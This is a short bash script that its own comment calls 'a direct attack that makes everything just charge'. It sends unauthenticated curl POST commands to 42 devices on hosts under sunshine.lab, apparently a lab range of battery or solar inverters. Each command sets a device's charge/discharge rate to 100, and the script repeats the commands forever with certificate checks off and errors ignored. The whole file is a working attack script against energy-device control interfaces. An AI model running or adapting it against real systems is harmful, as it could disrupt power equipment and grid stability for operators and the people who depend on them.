#!/usr/bin/env bash
set -euo pipefail

###This is a direct attack that makes everything just charge
CMDS=(
  'curl -k -sS -X POST "https://115010_1.sunshine.lab:9001/api/v1/write/115010_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://11933_1.sunshine.lab:9001/api/v1/write/11933_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://12618_1.sunshine.lab:9001/api/v1/write/12618_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://129064_1.sunshine.lab:9001/api/v1/write/129064_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://170879_1.sunshine.lab:9001/api/v1/write/170879_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://170879_2.sunshine.lab:9001/api/v1/write/170879_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://170879_3.sunshine.lab:9001/api/v1/write/170879_3.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://180093_1.sunshine.lab:9001/api/v1/write/180093_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://197295_1.sunshine.lab:9001/api/v1/write/197295_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://197295_2.sunshine.lab:9001/api/v1/write/197295_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://218212_1.sunshine.lab:9001/api/v1/write/218212_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://219255_1.sunshine.lab:9001/api/v1/write/219255_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://229321_1.sunshine.lab:9001/api/v1/write/229321_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://229321_2.sunshine.lab:9001/api/v1/write/229321_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://23156_1.sunshine.lab:9001/api/v1/write/23156_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://281301_1.sunshine.lab:9001/api/v1/write/281301_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://281301_2.sunshine.lab:9001/api/v1/write/281301_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://281301_3.sunshine.lab:9001/api/v1/write/281301_3.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://288490_1.sunshine.lab:9001/api/v1/write/288490_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://288490_2.sunshine.lab:9001/api/v1/write/288490_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://357101_1.sunshine.lab:9001/api/v1/write/357101_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://357101_2.sunshine.lab:9001/api/v1/write/357101_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://357101_3.sunshine.lab:9001/api/v1/write/357101_3.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://404945_1.sunshine.lab:9001/api/v1/write/404945_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://404945_2.sunshine.lab:9001/api/v1/write/404945_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://405914_1.sunshine.lab:9001/api/v1/write/405914_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://406755_1.sunshine.lab:9001/api/v1/write/406755_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://420644_1.sunshine.lab:9001/api/v1/write/420644_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://437325_1.sunshine.lab:9001/api/v1/write/437325_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://459711_1.sunshine.lab:9001/api/v1/write/459711_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://459711_2.sunshine.lab:9001/api/v1/write/459711_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://464636_1.sunshine.lab:9001/api/v1/write/464636_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://46648_1.sunshine.lab:9001/api/v1/write/46648_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://494283_1.sunshine.lab:9001/api/v1/write/494283_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://494283_2.sunshine.lab:9001/api/v1/write/494283_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://506556_1.sunshine.lab:9001/api/v1/write/506556_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://506556_2.sunshine.lab:9001/api/v1/write/506556_2.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://52401_1.sunshine.lab:9001/api/v1/write/52401_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://533874_1.sunshine.lab:9001/api/v1/write/533874_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://539175_1.sunshine.lab:9001/api/v1/write/539175_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://63786_1.sunshine.lab:9001/api/v1/write/63786_1.setChargeDischargeRate/100"'
  'curl -k -sS -X POST "https://71175_1.sunshine.lab:9001/api/v1/write/71175_1.setChargeDischargeRate/100"'
)

# runs forever
while true; do
  for cmd in "${CMDS[@]}"; do
    echo ">> $cmd"
    eval "$cmd" || true
  done
  sleep 1   # adjust or remove
done
